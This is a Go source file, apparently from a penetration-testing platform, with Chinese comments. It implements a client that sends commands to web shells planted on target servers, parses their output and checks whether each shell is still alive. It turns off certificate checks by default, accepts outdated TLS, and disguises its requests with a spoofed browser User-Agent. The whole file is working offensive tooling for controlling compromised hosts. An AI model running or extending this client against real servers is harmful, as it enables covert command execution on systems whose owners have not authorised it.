package webshell

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// DefaultTimeout 是单次命令执行的超时上限。目标挂了或命令本身阻塞时，
// 到点即断，避免一个卡住的 shell 把 HTTP 请求吊死。
const DefaultTimeout = 30 * time.Second

// maxOutputBytes 限制单次读回的响应体，防止目标返回超大内容把内存吃满。
const maxOutputBytes = 4 << 20

// Outcome 是一次连接的完整结果：解析后的输出 + 原始状态，供 UI 展示与判活。
type Outcome struct {
	// Output 是标记之间切出的命令输出；解析失败时为原始响应体。
	Output string
	// Raw 是未切分的响应体（截断后），排查「马没生效 / 被 WAF 拦了」时看它。
	Raw string
	// Parsed 表示响应里是否找到了成对的边界标记。false 基本等于「这不是一匹我们的马」。
	Parsed  bool
	Status  int
	Elapsed time.Duration
}

// Run 发送 Build() 编好的请求并取回输出。
//
// InsecureTLS 由调用方（webshells 表一行）显式决定，默认开：渗透目标常见自签
// 证书，严格校验会让绝大多数马连不上；这不是「悄悄关掉证书校验」，用户在页面上
// 能看到、也能关掉。代理走环境变量（HTTP_PROXY/HTTPS_PROXY），与 ARTEX 其他
// 出网组件一致。
func Run(ctx context.Context, t *Target, p *Plan, timeout time.Duration) (*Outcome, error) {
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	if !strings.EqualFold(t.Type, TypePHPCmd) && p.Raw {
		return nil, errors.New("连接计划与目标类型不匹配")
	}
	u, err := url.Parse(strings.TrimSpace(t.URL))
	if err != nil {
		return nil, fmt.Errorf("WebShell URL 无效: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return nil, errors.New("WebShell URL 只支持 http/https")
	}

	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			Proxy:       http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{Timeout: 15 * time.Second, KeepAlive: 30 * time.Second}).DialContext,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: t.InsecureTLS, // #nosec G402 — 由该行记录的 insecure_tls 显式控制
				// 目标常见老旧 JDK/OpenSSL，放宽最低版本否则握手直接失败。
				MinVersion: tls.VersionTLS10,
			},
		},
	}
	reqCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(reqCtx, p.Method, u.String(), strings.NewReader(p.Body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", p.ContentType)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36")

	start := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, readErr := io.ReadAll(io.LimitReader(resp.Body, maxOutputBytes))
	out := &Outcome{Status: resp.StatusCode, Elapsed: time.Since(start)}
	if readErr != nil {
		return nil, fmt.Errorf("读取响应失败: %w", readErr)
	}
	out.Raw = string(body)
	// 标记切分只对非裸输出型马做；裸输出型（php_cmd）响应体整个就是结果。
	if !p.Raw {
		parsed, ok := p.Parse(out.Raw)
		out.Parsed = ok
		if ok {
			out.Output = parsed
		} else {
			out.Output = out.Raw
		}
	} else {
		out.Parsed = true
		out.Output = out.Raw
	}
	return out, nil
}

// ProbeCommand 是判活用的无害命令：只回显一个固定串，不读文件、不改任何东西。
const ProbeCommand = "echo artex_probe_ok"

// WindowsProbe 用于已知 Windows 目标（cmd.exe 的 echo 语法）。
const WindowsProbe = "echo artex_probe_ok"

// Check 执行一次判活探测，返回 (是否可连接, 输出或错误)。
func Check(ctx context.Context, t *Target, timeout time.Duration) (bool, string, error) {
	p, err := Build(t, ModeCommand, ProbeCommand)
	if err != nil {
		return false, "", err
	}
	out, err := Run(ctx, t, p, timeout)
	if err != nil {
		return false, "", err
	}
	if !out.Parsed {
		return false, fmt.Sprintf("HTTP %d，响应中缺少标记，可能不是本工具生成的马或被拦截", out.Status), nil
	}
	return true, out.Output, nil
}
